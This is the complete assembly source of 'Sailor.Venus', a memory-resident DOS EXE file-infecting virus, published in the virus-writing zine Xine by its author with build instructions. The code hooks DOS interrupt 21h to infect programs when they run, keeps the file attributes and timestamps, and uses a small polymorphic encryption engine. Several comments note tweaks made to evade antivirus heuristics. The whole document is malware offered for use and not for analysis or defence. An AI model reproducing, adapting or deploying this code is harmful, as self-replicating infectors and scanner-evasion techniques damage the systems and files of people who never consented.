;
;                                        /-----------------------------\
;                                        | Xine - issue #1 - Phile 020 |
;                                        \-----------------------------/
;
;
;
;                              ...once again...
;                          b0z0 of the iKx presents
;                                Sailor.Venus
;
;  Here is the second member of my Pretty Sailors family. It's a simple EXE
; infector that infect on execute (4bh). Of course it will preserve attributes,
; time and date of creation. The virus will fill the last page with shit stuff
; and will place itself on a new one. The virus has a small polymorphic crap.
; The size of the decriptor is fixed (0fh bytes). The encryption/decryption
; routine use the ADD/SUB/XOR operations on bytes or words (randomly selected)
; with a random value. When operating on a byte/word the used register is DI
; or SI. All the code isn't everytime encrypted, infact the mutation routine
; can generate decryptors that encrypt every second (or third) byte when
; encrypting bytes and can generate decryptors that encrypt a word and leave
; clear a byte when encrypting words.
;  This is my first attempt to create a small quite polymorphic engine, and
; i promise that the next time it will be smaller, not as scannable as this,
; and also a little more poly. :)
;
; have phun!
;
; To compile:
;   TASM /M2 VENUS.ASM
;   TLINK VENUS

.model tiny
.code
        assume  cs:@code
org 0h

entry_point:
start_code:
;;       this code will be overwritten by the decryptor - FG use only ;;

tempzone  db      0dh dup (90h)

        push    cs
        pop     ds
;;                  here finish the overwritten code                  ;;
        call    install_in_memory       ;let's go

        push    es
        pop     ds

        mov     ax,es                   ;vic_cs points on old proggy
        add     ax,10h
        add     cs:[vic_cs],ax

        cli                             ;restore old ss:sp
        mov     sp,word ptr cs:[vic_sp]
        add     ax,word ptr cs:[vic_ss]
        mov     ss,ax
        sti

        sub     ax,ax                   ;put zeros in regs
        sub     dx,dx
        xor     bx,bx
        sub     cx,cx
        xor     di,di
        sub     si,si

        db      0eah    ; jmp far to the old program
vic_ip  dw      00000h
vic_cs  dw      0fff0h  ; for the first gen go to PSP:00h -> int 20h
vic_sp  dw      ?
vic_ss  dw      ?

install_in_memory:
                push    es
                push    cs
                pop     ds
                mov     ax,6b2dh                ; check if we are resident
                int     21h
                cmp     ah,al
                je      go_away

                push    es
                mov     ax,3521h                ; get int 21 adress
                int     21h
                mov     word ptr [old_int21_off],bx  ;store int21 offset
                mov     word ptr [old_int21_seg],es  ; and segment
                pop     es

                mov     ax,es               ; es=psp
                dec     ax                  ; psp-1=mcb
                mov     ds,ax               ; DS = segment of programs mcb
                sub     si,si
l4mcb:                                      ; look for last mcb in chain
                cmp     byte ptr [si],'Z'   ; is the last?
                je      last
                inc     ax
                add     ax,word ptr [si+03h]  ; nope, search for last
                mov     ds,ax
                jmp     l4mcb

last:
                sub     word ptr [si+03h],code_size_para  ; = mcb+03h
                add     ax,word ptr [si+03h]
                sub     word ptr [si+12h],code_size_para  ; = psp+02h
                inc     ax                  ; AX first usable segment

                cld
                sub     di,di               ; di=0
                push    cs
                pop     ds                  ; ds points on code
                mov     cx,(code_size+1)/2
                mov     es,ax               ; es points on our usable segment
                lea     si,start_code       ; si points on our code
                rep     movsw               ; move virus
                push    es

                mov     ax,2621h        ; install our interrupt handler
                dec     ah
                pop     ds              ; get mem segment where we are located
                mov     dx,[offset int21_handler]
                int     21h
go_away:
                pop     es
                ret
int21_handler:
                cmp     ax,6b2dh        ; internal admin stuff :)
                jne     no_check
                sub     ah,3eh
                iret
no_check:
                push    bx
                mov     bx,4b00h
                cmp     ax,bx          ; execute
                pop     bx
                je      exec

                jmp cs:old_int21
int24_handler:
                mov     al,03h
                iret
old_int21 label dword
old_int21_off      dw   ?                       ;original int21 offset
old_int21_seg      dw   ?                       ;original int21 segment
ourname         db      0,'Sailor.Venus',0
author          db      '-b0z0/iKx-',0

exec:
                push    si
                push    di
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    bp

                push    ds
		push    dx 
                mov     ax,3524h          ;get int24h seg and off
		int     21h
                mov     word ptr cs:[old_int24_off],bx  ;store them
                mov     word ptr cs:[old_int24_seg],es

                lea     dx,int24_handler  ;set our int24h handler
                mov     ax,2524h
		int     21h
                pop     dx
                pop     ds

                mov     ax,4300h        ;get file attributes
                int     21h

                push    ds              ;save ASCIIZ string with file name
                push    dx
                push    cx              ;save attributes
                xor     cx,cx           ;delete attributes
                call    set_attr

                mov     ax,3d02h        ;open for r/w
                int     21h
                jnc     infectit
                jmp     exit_infect
infectit:
                mov     bx,ax           ;bx file handle
                push    cs
                pop     ds

                mov     ax,5700h        ;get time/date
                int     21h
                push    dx              ;store them
                push    cx

                mov     ah,3fh          ;read da head
                mov     cx,1ch
                lea     dx,exehead
                mov     si,dx
                int     21h

                cmp     byte ptr [si],'M'         ;is exe?
                je      is_exe
nopein:
                jmp     not_exe
is_exe:
                cmp     byte ptr [si+01h],'Z'      ;is exe?
                jne     nopein
                cmp     byte ptr [si+18h],'@'      ;winexes?
                je      nopein
                cmp     word ptr [si+12h],'VS'     ;sailorvenus marker?
                je      nopein
                cmp     word ptr [si+1ah],00h      ;internal ovl?
                jne     nopein
                mov     cx,word ptr [si+02h]
                mov     ax,512
                sub     ax,cx
                push    ax

                mov     al,02h          ;go to the end of the file
                call    movefile
                call    normal          ;check if _really_ no overlays
                pop     cx
                cmp     dx,word ptr [lendx]  ;compare lseek length with
                ja      nopein               ;length of image that will
                cmp     ax,word ptr [lenax]  ;be loaded by the loader
                ja      nopein

                add     ax,cx                   ;add our alignment bytes
                adc     dx,00h
                push    ax
                push    dx

                mov     ah,40h                  ;write some shit to align
                mov     dx,0f00h                ;from ds:0f00 :)
                int     21h
                mov     word ptr [si+02h],00h

                mov     cx,word ptr [si+14h] ;store old IP
                mov     vic_ip,cx
                mov     cx,word ptr [si+16h] ;store old CS
                mov     vic_cs,cx
                mov     cx,word ptr [si+10h] ;store old SP
                mov     vic_sp,cx
                mov     cx,word ptr [si+0eh] ;store old SS
                mov     vic_ss,cx

                pop     dx
                pop     ax
                push    ax
                push    dx

                mov     cx,10h
                div     cx

                sub     ax,word ptr [si+8h]

                mov     word ptr [si+16h],ax    ;new CS
                mov     word ptr [si+14h],dx    ;new IP (will be zero)

                add     dx,offset ourstack      ;SP after us

                mov     word ptr [si+0eh],ax    ;new SS
                mov     word ptr [si+10h],dx    ;new SP

                pop     dx                      ;length
                pop     ax

                add     ax,code_size
                adc     dx,00h
                mov     cx,512
                div     cx
                inc     ax
                mov     word ptr [si+04h],ax       ;new nr of pages
                mov     word ptr [si+02h],dx       ;new image mod 512
                mov     word ptr [si+12h],'VS'     ;marker

                push    ds
                push    si
                mov     ax,08d00h       ;some free (? :) ) mem
                mov     es,ax
                sub     di,di
                mov     si,di
                mov     cx,code_size
                push    cx
                rep     movsb           ;copy virus in a piece of mem

                call    muta            ;mutate a little our code

                mov     ah,40h          ;write virus at end
                pop     cx
                sub     dx,dx
                int     21h
                pop     si
                pop     ds

                mov     al,00h          ;move at begin
                call    movefile

                mov     ah,3fh          ;write new exe header
                inc     ah
                mov     cx,1ch
                mov     dx,si
                int     21h
not_exe:
                pop     cx              ;old date/time
                pop     dx
                mov     ax,5601h        ;restore old date time
                inc     ah              ;don't warn tbscan heuristic
                int     21h

                mov     ah,3eh          ;close file
                int     21h
exit_infect:
                pop     cx
                pop     dx
                pop     ds
                call    set_attr

                mov     ax,2524h
                mov     dx,cs:[old_int24_off]
                mov     ds,cs:[old_int24_seg]
                int     21h                     ; restore int24h

                pop     bp
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     di
                pop     si
                jmp  cs:old_int21
normal:
                push    ax              ;calculate lenght of loaded
                push    dx              ;image from header
                mov     cx,word ptr [si+04h]
                mov     ax,512
                mul     cx
                add     ax,word ptr [si+02h]
                adc     dx,00h
                mov     word ptr [lenax],ax
                mov     word ptr [lendx],dx
                pop     dx
                pop     ax
                ret
movefile:                               ;move through the file
                mov     ah,42h
                cwd                     ;cx=dx=00h
                sub     cx,cx
                int     21h
                ret
set_attr:                                   ;set attributes to CX
                mov     ax,4201h            ;set attributes
                inc     ah                  ;g'bye tbscan F flag
                int     21h
                ret
muta:
;       input es:00h
;
;       the mutation routine will be something like:
;
;       mov     di/si,length_decryptor
;       mov     cx,length_encrypted_code
;dec:
;       add/sub/xor     byte/word ptr cs:[di/si],_immediate_
;       inc     (di/si)/nop     (always inc when working with words)
;       inc     (di/si)/nop
;       inc     di/si
;       loop    dec
;
        push    bx
        lea     si,enc_value            ;si on encryption value
        mov     bx,9047h                ;bh=NOP bl=INC [DI]
                                        ;just a little optimized ;)

        in      al,40h                   ;rnd value
        mov     byte ptr [si],al         ;encryption value

        mov     dl,046h
        mov     byte ptr [si-3],2eh      ;write the CS:

        mov     cx,offset enctable              ;select the enc method
        mov     di,[si+02fh]                    ;si+2fh --> encselected
        push    di
        add     di,cx
        mov     ch,[di]
        mov     byte ptr [si-1],ch

        pop     cx
        shr     cx,1
        jnc     isadi
        mov     byte ptr [si-9],0beh           ;on decryptor
        mov     byte ptr [si+3],dl             ;SI used
        cmp     byte ptr [si+1],bh
        je      nosecondinc
        mov     byte ptr [si+1],dl

nosecondinc:
        cmp     byte ptr [si+2],bl
        jne     finchanges
        mov     byte ptr [si+2],dl
        jmp     finchanges

isadi:
        mov     byte ptr [si-9],0bfh           ;the selected instruction
        mov     byte ptr [si+3],bl             ;need DI operands
        cmp     byte ptr [si+1],bh
        je      notwoincs
        mov     byte ptr [si+1],bl

notwoincs:
        cmp     byte ptr [si+2],dl
        jne     finchanges
        mov     byte ptr [si+2],bl

finchanges:

        push    si
        mov     cx,length_dec
        sub     di,di
        sub     si,09h                          ;si on decryptor
        rep     movsb                           ;copy the decryptor
        pop     si
        push    di

        mov     byte ptr [si-3],bh              ;no CS: in the encryptor
        mov     di,offset dectable              ;select the right encryptor
        mov     cx,[si+02fh]
        sub     di,cx
        mov     ch,[di]
        mov     byte ptr [si-1],ch
        dec     word ptr [si+02fh]              ;rotate trought the pox enc.
        jnz     notcicle
        mov     word ptr [si+02fh],07h

notcicle:
        pop     di
        push    es
        pop     ds                           ;ds on code to be encrypted
        push    si
        push    di                           ;di=si, so any encryption will
        pop     si                           ;work correctly
        jmp     encryptor

decryptor:
        mov     di,length_dec

encryptor:
        mov     cx,code_size-length_dec

the_loop:
                db      2eh             ;CS:

our_loop:
                db      80h,2dh          ;the encrtption method
enc_value       db      00h              ;,immediate8
        nop                              ;which bytes will we enc/decrypt
        nop
        inc      di
        loop     the_loop

decryptor_end:
        pop     si
        push    ds
        push    cs
        pop     ds

        shr     al,1                    ;select if the next will encrypt
        jc      tobyte                  ;word or bytes

toword:
       mov      byte ptr [si-2],83h      ;to word
       mov      byte ptr [si+2],bh
       mov      byte ptr [si+1],bl       ;must be two incs
       shr      al,1
       jc       dontdo
       mov      byte ptr [si+2],bl       ;or three

dontdo:
       jmp      letsgo

tobyte:
       mov      byte ptr [si-2],80h      ;to byte
       shr      al,1                      ;select if encrypt any byte or
       jnc      letsgo                   ;only every two
       mov      byte ptr [si+1],bh

letsgo:
       pop      ds
       pop      bx
       ret

encselected     dw      07h
enctable:                                ;poxible enc/dec operations
        db      90h
        db      04h     ;ADD [si]
        db      05h     ;ADD [di]
        db      34h     ;XOR [si]
        db      35h     ;XOR [di]
        db      34h     ;XOR [si]
        db      2dh     ;SUB [di]
        db      2ch     ;SUB [si]
dectable:
end_code:               ;anthing after this line wouldn't be in the file

old_int24_off      dw   ?                       ;original int24 offset
old_int24_seg      dw   ?                       ;original int24 segment

lenax           dw      ?
lendx           dw      ?
exehead         db      1dh dup(?)

length_dec=decryptor_end-decryptor

code_size=end_code-start_code
code_size_para=((code_size+0fh)/10h)+2


lenghtstack  db      256  dup (?)
ourstack:


end entry_point
